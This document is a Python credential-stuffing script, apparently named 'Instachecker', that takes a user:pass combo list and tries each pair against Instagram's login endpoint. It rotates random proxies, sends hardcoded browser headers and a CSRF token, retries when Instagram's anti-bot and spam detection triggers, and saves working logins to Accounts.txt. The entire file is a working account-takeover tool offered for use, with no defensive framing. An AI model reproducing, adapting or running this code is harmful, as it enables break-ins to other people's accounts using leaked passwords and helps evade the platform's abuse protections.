import threading
import requests
from itertools import islice
import random

runner = int(0)
x = int(0)


def Redline(Run, listname, x, proxylist):
    passlist = open(listname, "r", encoding="utf8")
    while Run == True:
        for line in islice(passlist, x, None):
            ltemp = passlist.readline()
            passlist.close()
            break
        x = x + 1
        email = ltemp.partition(":")[0]
        passw = ltemp.partition(":")[2]
        passw = passw.rstrip()
        with open(proxylist) as f:
            lines = [line.rstrip('\n') for line in f]
        rnd_line = random.choice(lines)
        o = rnd_line[:-1]
        proxzy = "https://" + o
        proxz = {
            'https': proxzy,
        }
        if email == "" and passw == "":
            print("End of File Reached. Exiting Program...")
            Run = False
        url = "https://www.instagram.com/accounts/login/ajax/"
        payload = 'username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false'.format(email, passw)
        headers = {
            'authority': 'www.instagram.com',
            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
            'x-instagram-ajax': '82a581bb9399',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'user-agent': '',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cookie': ''
        }

        response = requests.request("POST", url, headers=headers, data=payload, proxies=proxz)
        response = response.text.encode('utf8')
        responseshrt = str(response[0:17])
        return email, passw, responseshrt, x, Run, proxzy


def PostRequest(email, passw, responseshrt, x, prozxy):
    PostRequest.z = False
    Fixed = str(b'{"user": true, "u')
    FixedRetry = str(b'{"message": "chec')
    FixedError = str(b'{"message": "feed')
    FixedError2 = str(b'{"message": "Plea')
    Errorshrt = str(b'{"errors": {"erro')
    if responseshrt == Fixed:
        accounts = open("Accounts.txt", "a")
        accounts.write("{}:{}\n".format(email, passw))
        print("Line {} contains a valid credentials and has been written to Accounts.txt".format(x))
        accounts.close()
    elif responseshrt == FixedRetry:
        print("Line {} has encounter a error (Instagram anti-bot) trying current line...".format(x))
        PostRequest.z = True
    elif responseshrt == FixedError or responseshrt == FixedError2:
        print("Instagram Spam detection triggered on line {} retrying and printing proxy used".format(x))
        print(prozxy)
        PostRequest.z = True
    elif responseshrt == Errorshrt:
        print("Proxy Error Retrying line {}".format(x))
        PostRequest.z = True
    else:
        print("Line {} doesn't contain valid credentials ".format(x))



print("""

 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░           ░       ░                 ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                           ░                       ░                               
----------------------------------------------by peel1---------------------------------------------
                                                                          
                                                                                                                                                                                                  
""")

listname = input("name of user:pass list (must be in same directory as script) with .txt. For example DB.txt >")
proxylist = input("name of proxy list IP:PORT (must be in same directory as script) with .txt. For example Proxylist.txt >")

def Shredding(runner):
    global x
    if runner == 0:
        x = int(0)
    Run = True
    email, passw, responseshrt, x, Run, proxzy = Redline(Run, listname, x, proxylist)
    runner = runner + 1
    return email, passw, responseshrt, x, Run, runner, proxzy


Shreader1 = threading.Thread(target=Shredding, args=(runner,))
Shreader2 = threading.Thread(target=Shredding, args=(runner,))
Shreader3 = threading.Thread(target=Shredding, args=(runner,))
Shreader4 = threading.Thread(target=Shredding, args=(runner,))

y = int(0)
while True == True:
    if y == 0:
        Shreader1.start()
        Shreader2.start()
        Shreader3.start()
        Shreader4.start()
        y = y + 1
    Shreader1.join()
    Shreader2.join()
    Shreader3.join()
    Shreader4.join()
    email, passw, responseshrt, x, Run, Runner, proxzy = Shredding(runner)
    PostRequest(email, passw, responseshrt, x, proxzy)
    if PostRequest.z == True:
        x = x - 1
    runner = runner + 1
